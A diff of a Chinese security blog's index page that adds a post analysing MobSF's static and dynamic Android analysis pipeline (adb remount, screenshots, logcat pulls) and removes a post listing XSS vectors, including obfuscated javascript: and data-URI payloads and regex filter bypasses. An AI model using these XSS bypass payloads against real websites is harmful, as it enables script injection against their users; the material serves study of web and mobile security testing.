@@ -312,6 +312,84 @@
 
 
   
+    <article id="post-移动安全/mobSF架构分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/10/移动安全/mobSF架构分析/">MobSF框架分析</a>
+    </h1>
+  
+
+        <a href="/2017/01/10/移动安全/mobSF架构分析/" class="archive-article-date">
+  	<time datetime="2017-01-10T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="总体"><a href="#总体" class="headerlink" title="总体"></a>总体</h3><p>mobSF使用django框架开发，使用sqlite进行的存储，可以上传代码、app、zip进行扫描，可以进行静态分析和动态分析</p>
+<h3 id="静态扫描"><a href="#静态扫描" class="headerlink" title="静态扫描"></a>静态扫描</h3><p>静态扫描就是反编译apk的过程，对反编译后的代码进行四大组件的分析，在AndroidManifest中把所有能被调用的组建进行查找;后面对代码进行分析，通过工具获取到反编译后的代码，使用正则对代码提取关键子。</p>
+<p>过程：</p>
+<p>上传apk后，首先进行zip的解压，而后使用AXMLPrinter2.jar提取app中的AndroidManifest.xml文件，对AndroidManifest.xml进行分析，获取暴露出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SERVICES,ACTIVITIES,RECEIVERS,PROVIDERS,LIBRARIES,PERM,PACKAGENAME,MAINACTIVITY,MIN_SDK,MAX_SDK,TARGET_SDK,ANDROVER,ANDROVERNAME</div><div class="line">MANIFEST_ANAL,EXPORTED_ACT,EXPORTED_CNT</div></pre></td></tr></table></figure>
+<p>分析权限找到危险的权限行为</p>
+<p>使用CertPrint.jar分析证书问题</p>
+<p>后面使用Dex2Jar将dex转变为jar文件，使用到的enjarify</p>
+<p>使用Dex2Smali(baksmali.jar)将dex转变为smali代码</p>
+<p>使用jd-core.jar、cfr_0_115.jar、procyon-decompiler-0.5.30.jar将jar包转为为可读的java代码</p>
+<p>对代码中的字符进行分析，获取app中的url、email等信息</p>
+<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>动态分析的架构比较麻烦，惨用了virtualbox构造app的运行环境，并使用了virtualbox的操作api，利用adb相关操作，设置代理等操作，获取app的运行相关信息</p>
+<p>过程：</p>
+<h5 id="创建虚拟运行环境"><a href="#创建虚拟运行环境" class="headerlink" title="创建虚拟运行环境"></a>创建虚拟运行环境</h5><p>获取VM的uuid和Snapshot UUID、运行虚拟机的ip等设置在setting里面。</p>
+<h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>startTornado？</p>
+<h5 id="连接虚拟运行环境"><a href="#连接虚拟运行环境" class="headerlink" title="连接虚拟运行环境"></a>连接虚拟运行环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb, &quot;connect&quot;,getIdentifier()</div></pre></td></tr></table></figure>
+<h5 id="重新挂载"><a href="#重新挂载" class="headerlink" title="重新挂载"></a>重新挂载</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> settings.REAL_DEVICE:</div><div class="line">    subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"su"</span>, <span class="string">"-c"</span>, <span class="string">"mount"</span>, <span class="string">"-o"</span>, <span class="string">"rw,remount,rw"</span>, <span class="string">"/system"</span>])</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"su"</span>, <span class="string">"-c"</span>, <span class="string">"mount"</span>, <span class="string">"-o"</span>, <span class="string">"rw,remount,rw"</span>, <span class="string">"/system"</span>])</div><div class="line">    <span class="comment">#This may not work for VMs other than the default MobSF VM</span></div><div class="line">    subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"mount"</span>, <span class="string">"-o"</span>, <span class="string">"rw,remount"</span>, <span class="string">"-t"</span>, <span class="string">"rfs"</span>, <span class="string">"/dev/block/sda6"</span>, <span class="string">"/system"</span>])</div></pre></td></tr></table></figure>
+<h5 id="安装app并启动"><a href="#安装app并启动" class="headerlink" title="安装app并启动"></a>安装app并启动</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb -s 设备id install -r apk_path</div><div class="line">adb -s deviceid shell am start -n app</div></pre></td></tr></table></figure>
+<h5 id="获取运行窗口"><a href="#获取运行窗口" class="headerlink" title="获取运行窗口"></a>获取运行窗口</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"dumpsys"</span> ,<span class="string">"window"</span>]</div></pre></td></tr></table></figure>
+<h5 id="抓取运行窗口"><a href="#抓取运行窗口" class="headerlink" title="抓取运行窗口"></a>抓取运行窗口</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier() ,<span class="string">"shell"</span>, <span class="string">"screencap"</span>, <span class="string">"-p"</span>, <span class="string">"/data/local/screen.png"</span>])</div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier() ,<span class="string">"pull"</span>, <span class="string">"/data/local/screen.png"</span>, SCRDIR + <span class="string">"screenshot-"</span>+str(r)+<span class="string">".png"</span>])</div></pre></td></tr></table></figure>
+<h5 id="启动暴露出的activity和模拟点击"><a href="#启动暴露出的activity和模拟点击" class="headerlink" title="启动暴露出的activity和模拟点击"></a>启动暴露出的activity和模拟点击</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"am"</span>,<span class="string">"start"</span>, <span class="string">"-n"</span>, PKG+<span class="string">"/"</span>+line])</div><div class="line">Wait(<span class="number">4</span>)</div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"screencap"</span>, <span class="string">"-p"</span>, <span class="string">"/data/local/screen.png"</span>])</div><div class="line"><span class="comment">#? get appended from Air :-() if activity names are used</span></div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"pull"</span>, <span class="string">"/data/local/screen.png"</span>, SCRDIR + <span class="string">"expact-"</span>+str(n)+<span class="string">".png"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Activity Screenshot Taken"</span></div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"am"</span>, <span class="string">"force-stop"</span>, PKG])</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Stopping App"</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">args=[adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>,<span class="string">"input"</span>,<span class="string">"tap"</span>,x_axis,y_axis]</div></pre></td></tr></table></figure>
+<p>#####—</p>
+<p>title: 加强版smail注入<br>date: 2017-01-10 11:12:16<br>tags: [移动安全]<br>type: “移动安全”<br>— 安装xposed框架和证书</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">os.system(adb+<span class="string">' -s '</span>+getIdentifier()+<span class="string">' logcat -d dalvikvm:W ActivityManager:I &gt; "'</span>+APKDIR + <span class="string">'logcat.txt"'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Downloading Logcat logs"</span></div><div class="line"><span class="comment">#os.system(adb+' -s '+getIdentifier()+' logcat -d Xposed:I *:S &gt; "'+APKDIR + 'x_logcat.txt"')</span></div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"pull"</span>, <span class="string">"/data/data/de.robv.android.xposed.installer/log/error.log"</span>, APKDIR + <span class="string">"x_logcat.txt"</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Downloading Droidmon API Monitor Logcat logs"</span></div><div class="line"><span class="comment">#Can't RCE</span></div><div class="line">os.system(adb+<span class="string">' -s '</span>+getIdentifier()+<span class="string">' shell dumpsys &gt; "'</span>+APKDIR + <span class="string">'dump.txt"'</span>);</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Downloading Dumpsys logs"</span></div><div class="line"></div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"am"</span>, <span class="string">"force-stop"</span>, PACKAGE])</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Stopping Application"</span></div><div class="line"></div><div class="line">subprocess.call([adb, <span class="string">"-s"</span>, getIdentifier(), <span class="string">"shell"</span>, <span class="string">"am"</span>, <span class="string">"force-stop"</span>, <span class="string">"opensecurity.screencast"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"\n[INFO] Stopping ScreenCast Service"</span></div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/01/10/移动安全/mobSF架构分析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-移动安全/加强版Smali Log注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1142,79 +1220,6 @@
 
 
   
-    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>css xss向量</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
-<ol>
-<li>利用反引号</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li>利用%2f</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>其他：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1277,7 +1282,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">智能硬件</a>
+                <a href="javascript:void(0)">安全测试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1285,11 +1290,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">软件</a>
+                <a href="javascript:void(0)">智能硬件</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">安全测试</a>
+                <a href="javascript:void(0)">软件</a>
               </li>
             
             <div class="clearfix"></div>
